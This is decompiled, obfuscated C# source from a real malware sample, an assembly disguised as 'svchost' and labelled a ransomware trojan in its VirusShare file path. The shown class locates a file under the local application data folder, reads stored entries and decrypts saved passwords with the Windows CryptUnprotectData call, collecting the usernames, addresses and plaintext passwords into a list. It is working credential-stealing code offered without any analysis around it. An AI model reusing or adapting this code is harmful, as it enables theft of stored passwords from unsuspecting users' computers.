// Decompiled with JetBrains decompiler
// Type:  
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E45764DC-C7D2-4855-ACE6-36DDF2A7CE43
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00020-msil\HEUR-Trojan-Ransom.Win32.Generic-f28f43dd6beec5a1c2a6ba0f2239097a5536103540470e107799ada5d2c2b131.exe

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

internal sealed class \u0002\u2000
{
  private static IntPtr \u0002 = (IntPtr) 0;

  public static void \u0002(bool _param0)
  {
    string path = !_param0 ? Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \u0005\u2003.\u0002(1067756906) : Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \u0005\u2003.\u0002(1067756855);
    if (!File.Exists(path))
      return;
    \u0002\u2000.\u0002(path, _param0);
  }

  public static void \u0002(string _param0, bool _param1)
  {
    \u0003\u2003 obj = new \u0003\u2003(_param0);
    obj.\u0002(\u0005\u2003.\u0002(1067756884));
    for (int index = 0; index <= obj.\u0002() - 1; ++index)
    {
      string str1 = obj.\u0002(index, \u0005\u2003.\u0002(1067756971));
      string str2 = obj.\u0002(index, \u0005\u2003.\u0002(1067756986));
      string str3 = \u0002\u2000.\u0002(Encoding.Default.GetBytes(obj.\u0002(index, \u0005\u2003.\u0002(1067756929))));
      if (_param1)
        \u000F\u2000.\u0002.Add(new \u0008\u2000(\u0005\u2003.\u0002(1067757036), str1, str2, str3, string.Empty));
      else
        \u000F\u2000.\u0002.Add(new \u0008\u2000(\u0005\u2003.\u0002(1067757053), str1, str2, str3, string.Empty));
    }
  }

  [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern bool CryptUnprotectData(
    ref \u0002\u2000.\u0002 _param0,
    string _param1,
    ref \u0002\u2000.\u0002 _param2,
    IntPtr _param3,
    ref \u0002\u2000.\u0003 _param4,
    int _param5,
    ref \u0002\u2000.\u0002 _param6);

  public static string \u0002(byte[] _param0)
  {
    \u0002\u2000.\u0002 obj1 = new \u0002\u2000.\u0002();
    \u0002\u2000.\u0002 obj2 = new \u0002\u2000.\u0002();
    \u0002\u2000.\u0003 obj3 = new \u0002\u2000.\u0003();
    GCHandle gcHandle = GCHandle.Alloc((object) _param0, GCHandleType.Pinned);
    \u0002\u2000.\u0002 obj4;
    obj4.\u0003 = gcHandle.AddrOfPinnedObject();
    obj4.\u0002 = _param0.Length;
    gcHandle.Free();
    \u0002\u2000.CryptUnprotectData(ref obj4, string.Empty, ref obj2, IntPtr.Zero, ref obj3, 0, ref obj1);
    byte[] numArray = new byte[obj1.\u0002];
    Marshal.Copy(obj1.\u0003, numArray, 0, obj1.\u0002);
    return Encoding.Default.GetString(numArray);
  }

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  internal struct \u0002
  {
    public int \u0002;
    public IntPtr \u0003;
  }

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  internal struct \u0003
  {
    public int \u0002;
    public int \u0003;
    public IntPtr \u0005;
    public string \u0008;
  }
}
